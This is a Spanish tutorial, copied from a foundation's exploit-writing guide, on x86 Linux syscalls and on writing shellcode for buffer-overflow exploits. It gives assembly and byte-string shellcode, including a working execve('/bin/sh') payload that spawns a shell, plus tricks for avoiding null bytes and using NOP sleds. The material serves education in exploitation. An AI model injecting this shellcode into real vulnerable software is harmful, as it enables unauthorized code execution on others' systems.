---
description: >-
  En este artículo nos centramos en desarrollar conceptos muy importantes a la
  hora de entender el funcionamiento de un Buffer Overflow como son los syscall
  y los shellcode.
---

# SYSCALL Y SHELLCODE

{% hint style="info" %}
Artículo copiado de la Fundación Sadosky escrito por Teresa Alberto.
{% endhint %}

{% embed url="https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/2-shellcode.html" %}

## INTRODUCCIÓN

En esta instancia el objetivo será aprovecharse de una vulnerabilidad de un programa para ejecutar código malicioso que no está en el binario original. En otras palabras, lo que se busca **ejecutar es un shellcode**.

Un **shellcode** es un código que se inyecta en la memoria de un programa vulnerable bajo la forma de un string de bytes.  
 El nombre _**shellcode**_ se refería históricamente a inyectar un programa shell que permite ejecutar cualquier otro comando, no obstante hoy el término se usa de manera general para hablar de la inyección de código malicioso. Es posible programar un shellcode para que haga cualquier cosa que se nos ocurra dado que en última instancia es en sí mismo un programa.

Un programa en C que utiliza funciones como `printf()` o `write()` de la biblioteca `libc`, usa esta biblioteca para realizar **llamadas al sistema operativo** que es el encargado de manejar cuestiones como la **escritura, lectura y ejecución de programas**. Hay que tener en cuenta que el shellcode no se va a cargar en memoria por el sistema operativo, sino que directamente es copiado a la memoria del programa vulnerable como una cadena de caracteres, aprovechando funciones como `strcpy()` y `gets()`.

Es por ello que, **si nuestro shellcode utiliza una función como** `write()` \(lo más probable es que necesitemos que lo haga\) **esas llamadas al sistema operativo deben ser manejadas directamente**. Es necesario entonces comprender el funcionamiento de las llamadas al sistema antes de continuar con la creación de un shellcode en sí mismo.

## LLAMADAS AL SISTEMA <a id="llamadas-al-sistema"></a>

A la hora de planear estrategias de ataque se usarán frecuentemente **llamadas al sistema**.

Los programas que corren en el espacio de usuario cuando requieren interactuar con el sistema operativo deben realizar _l**lamadas al sistema**_ **para que el sistema operativo realice las operaciones en su nombre**.

La manera en que se hace esta llamada es diferente para cada arquitectura, en el caso de **x86** los programas de usuario pueden **hacer una llamada al sistema con una interrupción por software** con la instrucción `int 0x80`.

**En Linux** cada llamada toma sus argumentos de los registros según el siguiente criterio:

```c
eax => nro de syscall
ebx => 1er argumento
ecx => 2do argumento
edx => 3er argumento 
```

Para saber el **número que corresponde a cada syscall** se puede consultar: `/usr/include/asm/unistd_32.h`.

**Según la syscall en cuestión será necesario definir también los valores de otros registros**.

Con `strace` es posible rastrear las llamadas a sistema que suceden cuando tenemos un programa en C tan simple como:

```c
test-syscalls.c

    #include 
    int main() {
    	printf("Hola mundo!\n");
    	return 0;
    }
```

```bash
    user@abos:~$ gcc -m32 -no-pie -o test-syscalls test-syscalls.c
    user@abos:~$ strace ./test-syscalls
    execve("./llamada-sistema", ["./llamada-sistema"], [/* 18 vars */]) = 0
    brk(0)                                  = 0x804a000
    ....
    fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0
    mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000
    
 => write(1, "Hola mundo!\n", 12)           = 12

    exit_group(0)                           = ?
    +++ exited with 0 +++
```

De este modo es posible rastrear la llamada al systema `write` que es la encargada de efectivamente imprimir el string.

### Syscall write: <a id="syscall-write"></a>

**Para imprimir por salida estándar** \(`stdout`\) **es necesaria la syscall write**.

```c
 $ man 2 write          ; documentación de syscalls

 WRITE(2)
 SYNOPSIS
     #include 
     ssize_t write(int fd, const void *buf, size_t count);
```

Con los registros seteados de la siguiente manera:

```c
eax => nro 4 syscall write
ebx => 1er argumento: fd o file descriptor. Es 1 para stdout.
ecx => 2do argumento: *buf o mensaje a imprimir.
edx => 3er argumento: count o longitud del mensaje.  
```

Ejemplo de una syscall `write` en assembler:

```c
section .data                  ; segmento DATA
  mensaje db "Hola mundo", 0x0a

section .text                  ; segmento TEXT
  global _start                ; punto de entrada del ELF

  _start:

  ; syscall write(1, mensaje, 11)
    mov eax, 4                 ; 4 = write, nro syscall
    mov ebx, 1                 ; 1 = stdout, filedescriptor
    mov ecx, mensaje           ; mensaje en ecx 
    mov edx, 11                ; longitud del mensaje (Hola mundo\n)
    int 0x80                   ; interrupcion de llamado al sistema
```

### Syscall exit: <a id="syscall-exit"></a>

**Para finalizar un proceso se usa el syscall exit**:

```bash
 $ man 2 exit

 EXIT(2)
 SYNOPSIS
       #include 
       void _exit(int status);
```

Los registros deben estar seteados de la siguiente manera:

```c
eax => nro 1 syscall exit
ebx => 1er argumento: status.   
```

Si quisieramos ejecutar `exit(0)`, el código assembler necesario sería:

```c
section .text                  ; segmento TEXT
  global _start                  ; punto de entrada del ELF

  _start:

  ; syscall exit(0)
    xor    ebx,ebx              ; ebx = 0, status code
    xor    eax,eax
    mov    al,0x1               ; 1 = exit, nro syscall
    int    0x80
```

### Syscall execve: <a id="syscall-execve"></a>

**Para ejecutar un programa se usa el syscall execve**, que corresponde al syscall 11.

```bash
 $ man 2 execve

 EXECVE(2)
 SYNOPSIS
     #include 
     int execve(const char *filename, char *const argv[], char *const envp[]);
```

Para ejecutar `execve` los registros deben estar seteados de la siguiente manera:

```c
eax => nro 11 syscall execve
ebx => 1er argumento: filename, un puntero al nombre del binario a ejecutar. 
ecx => 2do argumento: argv[], un puntero a un array de argumentos (comenzando por el nombre del binario y finalizando con un caracter nulo).
edx => 3er argumento: envp[], un puntero a un array de variables de entorno, que también finaliza en un caracter nulo.  
```

Para simplificar el código en assembler, buscamos ejecutar `execve("/bin/sh", NULL, NULL)` \(con `argv[]` y `envp[]` en `NULL`\). Para ello los registros deben estar seteados de la siguiente manera:

```c
eax => nro 11 syscall execve
ebx => 1er argumento: puntero al string /bin/sh.
ecx => 2do argumento: NULL
edx => 3er argumento: NULL
```

Y el código en assembler sería:

```c
 31 c0            xor    eax,eax
 50               push   eax           ; \0
 68 2f 2f 73 68   push   0x68732f2f    ; hs// en ASCII (little endian de //sh)
 68 2f 62 69 6e   push   0x6e69622f    ; nib/ en ASCII (little endian de /bin)
 89 e3            mov    ebx, esp      ; ebx => /bin//sh\0
 89 c1            mov    ecx, eax      ; ecx = 0x0
 89 c2            mov    edx, eax      ; edx = 0x0
 b0 0b            mov    al, 0x0b      ; 11 = execve, nro syscall
 cd 80            int    0x80
```

Ejemplo tomado de [Shell storm](http://shell-storm.org/shellcode/files/shellcode-811.php).

{% hint style="success" %}
**Consideraciones**: el uso de una doble barra de `/bin//sh` es por el problema de la escritura de caracteres nulos en el shellcode. La barra extra permite alinear el string `/bin//sh` en dos double-words \(de 4 bytes cada una\), quedando el `\0` final en la siguiente word o _palabra_. Este alineamiento permite generar ese `\0` final con un `xor`, sin tener el problema de la escritura de caracteres nulos. Si en cambio se elimina la doble barra, el `\0` formaría parte de la segunda double-word y con un `xor` no lograríamos incluirlo en el string y un mecanismo más complejo sería necesario. La cuestión de los caracteres especiales en el shellcode se desarrolla más adelante.
{% endhint %}

### Ensamblar y linkear <a id="ensamblar-y-linkear"></a>

Cuando compilamos un programa en C, [`gcc`](https://fundacion-sadosky.github.io/guia-escritura-exploits/herramientas.html#gcc) se ocupa de ensamblar el programa y linkearlo para lograr el archivo ELF ejecutable. De manera similar cuando partimos de un programa en assembler y queremos obtener un archivo ELF ejecutable podemos ensamblar el programa con `nasm -f ELF` y linkearlo con `ld`.  
 Para indicarle al linker dónde comienzan las instrucciones en assembler se agrega la línea `global _start`.

Creamos un programa `holaMundo.asm` en assembler con las llamadas `write()` y `exit()`:

```c
section .data                  ; segmento DATA
mensaje db "Hola mundo", 0x0a

section .text                  ; segmento TEXT
global _start                  ; punto de entrada del ELF

_start:

;syscall write(1, mensaje, 11)
        mov eax, 4                 ; syscall write: #4
        mov ebx, 1                 ; stdout filedescriptor: #1
        mov ecx, mensaje           ; mensaje en ecx
        mov edx, 11                ; longitud del mensaje (Hola mundo\n)
        int 0x80                   ; interrupcion

;syscall exit(0)
        mov eax, 1
        mov ebx, 0
        int 0x80
```

> **Consideraciones**: es importante tener en mente que el string se almacenó en la sección .data. En el siguiente apartado se retomará este punto y se explicará pórque no es posible conducirse de ese modo y se planteará una estrategia alternativa.

Lo ensamblamos:

```bash
user@abos:~$ nasm -f elf holaMundo.asm
```

`nasm` con el argumento `-f elf` ensambla el programa en un archivo objeto preparado para ser linkeado como un binario ELF. Como resultado genera el archivo objeto `holaMundo.o`.  
 Linkeamos ese archivo objeto:

```bash
user@abos:~$ ld -o holaMundo holaMundo.o
```

`ld` va a crear un binario ELF a partir del archivo objeto.  
 Ejecutamos y vemos la salida estándar y la finalización del programa:

```bash
user@abos:~$ ./holaMundo
Hola mundo
```

## SHELLCODE <a id="shellcode"></a>

Cuando se trata de un exploit que incluye un shellcode existen **3 instancias importantes**: 

* La programación del shellcode.
* Su inyección en memoria como string de bytes.
* Lograr su ejecución.

**El shellcode no es un programa ejecutable como cualquier otro, sus instrucciones deben ser autocontenidas para lograr su ejecución por parte del procesador sin importar el estado actual del programa vulnerable**. El shellcode no va a ser linkeado ni va a ser cargado en memoria como un proceso por el sistema operativo. Es por ello que los ejemplos de llamadas al sistema deben ser retocados para cumplir ciertos criterios:

1. **No disponemos del segmento data**: no es posible utilizar el segmento de datos en el código assembler del shellcode como se hizo con “Hola mundo” en el ejemplo anterior `holaMundo.asm`. El shellcode no se ejecutará como un programa corriente ni sus segmentos serán cargados en memoria por el sistema operativo. Es por ello que veremos maneras de manipular un string sin recurrir a la sección .data.
2. **Evitar caracteres especiales**: el shellcode no debe tener caracteres especiales como `\x00` entre sus bytes porque se copia en memoria con funciones que manipulan strings como `strcpy()`. Usarlos provocaría que el shellcode quede truncado. \(Es posible por prueba y error detectar qué caracter finaliza el copiado del shellcode en memoria, según la función vulnerable de la que se trate\).
3. **Mínima longitud**: el shellcode debe tener la mínima longitud posible porque en la mayoría de los casos no contamos con demasiado espacio en el búfer para almacenarlo.

### Programar un shellcode <a id="programar-un-shellcode"></a>

Es recomendable comenzar programando unx mismx los shellcodes más sencillos para comprender su funcionamiento y acercarse a la potencia de crear shellcodes ad-hoc. No obstante existen repositorios de shellcodes a disposición en [Shell storm](http://shell-storm.org/shellcode/) o [exploit-db](https://www.exploit-db.com/shellcode/). Es importante manipular estos binarios con extrema precaución, por ejemplo trabajando con un entorno virtualizado como buena práctica.

#### Estrategias para crear un shellcode inyectable dentro de un programa vulnerable: <a id="estrategias-para-crear-un-shellcode-inyectable-dentro-de-un-programa-vulnerable"></a>

Suponiendo que queremos con nuestro shellcode imprimir un mensaje por salida estándar, similar al siguiente programa en C:

```c
#include 
 
int main(){
	write(1, “you win!”, 8);
}
```

Seguimos la directivas indicadas anteriormente.

1. **No disponemos del segmento data**: el string “you win” debe ser almacenado en la pila directamente para evitar el uso del segmento de datos. Al hacerlo de esa manera necesitamos un puntero al string para pasarle como argumento a `write()` y lograr que se imprima ese mensaje, ya que no conocemos de antemano su dirección exacta.

   Para contar con la dirección del string podemos aprovechar que la instrucción `call` en assembler se encarga de almacenar en la pila la dirección que sigue al `call` antes de hacer el salto a la función llamada y de esta manera poder retornar una vez finalizada su ejecución. Agregamos un `call` ad-hoc seguido del string que sólo sirva para almacenar su dirección en un lugar conocido de la pila.

   `shellcode.asm`

   ```text
         section .text
           global _start
 
          _start:
    +---<   jmp short dummy        ; 1. salto a un dummy con el call
    | 
    |  -> imprimir_str:            ; 3. syscall write()
    |  |    pop ecx                  ; desapilo la dirección del string en ecx
    |  |  ....
    |  |
    |  | 
    +->|  dummy:                   
       +--< call imprimir_str      ; 2. llamo al código encargado de imprimir el mensaje
            db 'you win!A'         ; antes de saltar apila dirección de "you win!A"
                                   ; para retornar luego del call
   ```

   Una vez almacenada la dirección del string, con la instrucción `pop` lo almacenamos en un registro para su uso posterior.

2. **Evitar caracteres especiales**: se usan ciertos trucos para que al compilar el código binario no tenga caracteres nulos.
   * En las llamadas a sistema es frecuente tener que poner en cero un registro \(por ejemplo para el status del syscall `exit`\). Si en vez de copiar un cero usamos un OR exclusivo \(un XOR de un valor con sí mismo siempre da cero\) logramos el objetivo sin valores nulos en el código máquina.

     ```text
     instrucción      | código máquina
     mov eax, 0         \xb8\x00\x00\x00\x00     ; eax = 0. Pero con valores nulos en código máquina.
     xor eax, eax       \x31\xc0                 ; eax = 0. Sin valores nulos.
     ```

   * Cuando una instrucción manipula un registro de 32 bits \(como `eax`\) y el otro de sus operandos ocupa menos bits \(por ejemplo un entero como el número 2\) se completa con ceros, es decir 2 pasa a ser `0000 0002` y almacenado bajo el formato little endian `\x02\x00\x00\x00` como se puede ver en el código máquina de abajo. Para evitar los caracteres nulos finales es posible usar únicamente las [partes del registro](https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/imagenes/partes-registro.png) necesarias para la operación \(por ejemplo, con `al` se manipulan sólo los 8 bits menos significativos del registro\).

     ```text
     instrucción      | código máquina
     mov eax, 2         \xb8\x02\x00\x00\x00     ; eax = 00 00 00 02
     mov ax, 2          \x66\xb0\x02\x00         ; eax = ?? ?? 00 02
     mov al, 2          \xb0\x02                 ; eax = ?? ?? ?? 02. Sin caracteres nulos en cód. maquina
     ```

     Al hacer esto, el resto de los bits de `eax` tienen datos desconocidos, lo que puede provocar un funcionamiento inesperado. Por eso es importante antes de estas operaciones poner en 0 el registro.

     ```text
      instrucción      | código máquina
      xor eax, eax       \x31\xc0                 ; eax = 00 00 00 00
      mov al, 2          \xb0\x02                 ; eax = 00 00 00 02
     ```

     Finalmente, logramos un código máquina resultante `\x31\xc0\xb0\x02` que no tiene caracteres nulos.

   * ¿Cómo finalizar el string a imprimir sin usar un caracter especial que trunque el shellcode \(como el caracter nulo `\0`, nueva línea `\x0a` o _retorno de carro_ `\x0d`\)?  
      En estos casos usamos un caracter cualquiera para finalizar el string \(por ejemplo la letra `A`\) y después reemplazamos su valor por `\0`.

     ```text
          section .text
           global _start

           _start:
     +---<   jmp short dummy        ; 1. salto a un dummy con el call
     | 
     |  -> imprimir_str:            ; 3. syscall write()
     |  |    pop ecx                  ; ecx => 'you win!A'
     |  |    xor eax, eax
     |  |    mov [ecx+8], al          ; ecx => 'you win!\0'
     |  |    ....
     |  | 
     -->|  dummy:                   
        +--< call imprimir_str      ; 2. llamo al código encargado de imprimir el mensaje
             db 'you win!A'         ; antes de saltar apila dirección de "you win!A"
                                    ; para retornar luego del call
     ```

     Como resultado final tenemos en `ecx` la dirección del string `you win!\0`.

{% hint style="success" %}
**db** es la directiva _define byte_ que permite reservar espacio en memoria para un string, como en `db 'you win!A'`
{% endhint %}

1. **Mínima longitud**: en muchos casos dos instrucciones en assembler cumplen el mismo objetivo pero una de ellas consume menos bytes. Hay que estar atentxs para optar siempre por la opción menos costosa en espacio.  
    Por ejemplo si un syscall obliga a poner en 1 un registro, existen dos maneras de hacerlo:

   ```text
   instrucción      | código máquina
   xor ebx, ebx       \x31\xdb                 ; ebx = 00 00 00 00
   mov bl, 1          \xb3\x01                 ; ebx = 00 00 00 01
   ```

   ```text
   instrucción      | código máquina
   xor ebx, ebx       \x31\xdb                 ; ebx = 00 00 00 00
   inc ebx            \x43                     ; ebx = 00 00 00 01
   ```

   ¡Usando `inc` en vez de `mov` ahorramos 8 bits! Parece poco pero es clave cuando almacenamos un shellcode en espacios de memoria reducidos.

#### Shellcode que imprime “you win!” <a id="shellcode-que-imprime-you-win"></a>

1. Código en assembler: `shellcode.asm`

   ```text
           section .text
            global _start
            _start:
      +---<   jmp short dummy        ; 1.
      | 
      |  -> imprimir_str:            ; 3.
      |  |    xor eax,eax            ; eax = 0
      |  |    pop ecx                ; ecx => "you win!A"
      |  |    mov [ecx+8],al         ; ecx => "you win!\0"
      |  |    mov al,4               ; syscall write: #4
      |  |    xor ebx,ebx            ; ebx = 0
      |  |    inc ebx                ; stdout filedescriptor: #1
      |  |    xor edx,edx            ; edx = 0
      |  |    mov dl,9               ; longitud "you win!\0": 9
      |  |    int 0x80               ; write(1, string, 9)
      |  |    
      |  |    mov al,1               ; syscall exit: #1
      |  |    dec ebx                ; ebx = 0
      |  |    int 0x80               ; exit(0)
      |  |
      -->|  dummy:                   ; 2.
         +--< call imprimir_str      ; apilo addr "you win!A"
              db 'you win!A'
   ```

2. Shellcode como string  
    Existen varias maneras de obtener el código de máquina como cadena de caracteres a partir del código assembler. Con herramientas como [Online x86 de Defuse](https://defuse.ca/online-x86-assembler.htm#disassembly) o con [pwntools](https://docs.pwntools.com/en/stable/intro.html#assembly-and-disassembly) para trabajar en python.  
    Otra manera simple de obtenerlo es usando `hexdump` desde la consola.

   ```text
   user@abos:~$ nasm -f elf shellcode.asm                               ; ensamblamos
   user@abos:~$ ld -N shellcode.o -o shellcode                          ; linkeamos
   user@abos:~$ objcopy -j .text -O binary shellcode.o shellcode.bin    ; extraemos section .text 
   user@abos:~$ hexdump -v -e '"\\" 1/1 "x%02x"' shellcode.bin; echo    ; extraemos byte code de binario
   \xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41
   ```

   Y el código de máquina obtenido debe coincidir con el código de máquina mostrado en la segunda columna al desensamblar con `objdump`:

   ```text
   user@abos:~$ objdump -d -M intel shellcode                     
   shellcode:     file format elf32-i386

   Disassembly of section .text:
   
   08048060 <_start>:
    8048060: eb 16                 jmp    8048078 
   
   08048062 :
    8048062: 31 c0                 xor    eax,eax
    8048064: 59                    pop    ecx
    8048065: 88 41 08              mov    BYTE PTR [ecx+0x8],al
    8048068: b0 04                 mov    al,0x4
    804806a: 31 db                 xor    ebx,ebx
    804806c: 43                    inc    ebx
    804806d: 31 d2                 xor    edx,edx
    804806f: b2 09                 mov    dl,0x9
    8048071: cd 80                 int    0x80
    8048073: b0 01                 mov    al,0x1
    8048075: 4b                    dec    ebx
    8048076: cd 80                 int    0x80
   
   08048078 :
    8048078: e8 e5 ff ff ff        call   8048062 
    804807d: 79 6f                 jns    80480ee <_end+0x66>   ; \x79\x6f = "yo"
    804807f: 75 20                 jne    80480a1 <_end+0x19>   ; \x75\x20 = "u "
    8048081: 77 69                 ja     80480ec <_end+0x64>   ; \x77\x69 = "wi"
    8048083: 6e                    outs   dx,BYTE PTR ds:[esi]  ; \x6e = "n"
    8048084: 21                    .byte 0x21                   ; \x21 = "!"
    8048085: 41                    inc    ecx                   ; \x41 = "A"
   
   ```

   Es posible ver como el string es interpretado como instrucciones; es necesario obviarlas y convertir a ASCII el código máquina para verificar el texto “you win!A”

En todos los casos el shellcode como string que vamos a usar en los exploits para imprimir el mensaje “you win!” va a ser:

```c
   shellcode  = "\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43"
   shellcode += "\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5"
   shellcode += "\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41"           
```

#### Shellcode para lograr una shell <a id="shellcode-para-lograr-una-shell"></a>

El siguiente código de ejemplo fue tomado del libro Hacking the art of exploitation. Suponiendo que queremos obtener una shell con nuestro shellcode, de manera similar al siguiente programa en C:

```c
#include 
 
int main(){
	char filename[] = "/bin/sh\x00";
	char **argv, **envp;

	argv[0] = filename;             // único argumento: nombre del programa
	argv[1] = 0;                    // \0 fin del array de argumentos

	envp[0] = 0;                    // \0 fin del array de entorno

	execve(filename, argv, envp);
}
```

1. Código en assembler: `shellcode.asm`

   ```text
        section .text
          global _start

         _start:
   +---<   jmp short dummy        ; 1.
   | 
   |  -> shellcode:               ; 3.
   |  |    xor eax,eax            ; eax = 0
   |  |    pop ebx                ; ebx => "/bin/shABBBBCCCC"
   |  |    mov [ebx+7], al        ; execve("/bin/sh\0", BBBB, CCCC).
   |  |    mov [ebx+8], ebx       ; execve("/bin/sh\0", &"/bin/sh", CCCC). [ebx+8]: argv
   |  |    mov [ebx+12],eax       ; execve("/bin/sh\0", &"/bin/sh", 0000). [ebx+12]: envp
   |  |  
   |  |    lea ecx, [ebx+8]       ; ecx = argv
   |  |    lea edx, [ebx+12]      ; edx = envp
   |  |    mov al,11              ; syscall execve: #11
   |  |    int 0x80               ; execve("/bin/sh\0", &"/bin/sh", 0000)
   |  |    
   |  |    mov al,1               ; syscall exit: #1
   |  |    xor ebx, ebx           ; ebx = 0
   |  |    int 0x80               ; exit(0)
   |  |
   -->|  dummy:                   ; 2.
      +--< call shellcode         ; apilo addr "/bin/shABBBBCCCC"
           db '/bin/shABBBBCCCC'  ; execve(/bin/shA, BBBB, CCCC);
   ```

2. Shellcode como string

   ```text
   user@abos:~$ nasm -f elf shellcode.asm                               ; ensamblamos
   user@abos:~$ ld -N shellcode.o -o shellcode                          ; linkeamos
   user@abos:~$ objcopy -j .text -O binary shellcode.o shellcode.bin    ; extraemos section .text 
   user@abos:~$ hexdump -v -e '"\\" 1/1 "x%02x"' shellcode.bin; echo    ; extraemos byte code de binario
   \xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43
   ```

   El shellcode como string que vamos a usar en los exploits para obtener una shell va a ser:

   ```text
   shellcode  = "\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
   shellcode += "\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01"
   shellcode += "\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f"
   shellcode += "\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"          
   ```

Acá se presentan dos ejemplos de shellcodes, sin dudas existen muchas variantes que logran el mismo objetivo.

### Tobogán de NOPs <a id="tobog&#xE1;n-de-nops"></a>

Una dificultad a la hora de ejecutar el shellcode radica en saber exactamente en qué dirección de memoria se encuentra.  
 Para evitar errarle por pocos bytes se usa como recurso la instrucción No-Op o NOP \(No Operation instruction\). Cada NOP ocupa un byte \(0x90 en Assembler\) y es una instrucción que no hace nada, sólo avanza el contador del programa a la siguiente instrucción a ejecutar.  
 Si se agregan varias instrucciones NOP \(formando un `NOP sled` o tobogán de Nops que -sin hacer nada- lleven hacia la ejecución del shellcode\) y se modifica el flujo de ejecución para que salte allí, sabemos que eventualmente el shellcode se va a ejecutar.  
 Esto permite tener margen de error al definir la dirección de retorno y aumenta las chances de ejecutar el shellcode.

## REFERENCIAS <a id="material-consultado"></a>

\[1\]. Anley, C., Heasman, J., Linder, F., Richarte, G. \(2007\). The Shellcoder’s Handbook: Discovering and Exploiting Security Holes.  
 \[2\]. Erickson, Jon. \(2008\). Hacking: the art of exploitation.  
 \[3\]. D’Antoine, Sophia. \(2015\). Shellcoding: Modern Binary Exploitation CSCI 4968. Disponible en: http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05\_lecture.pdf

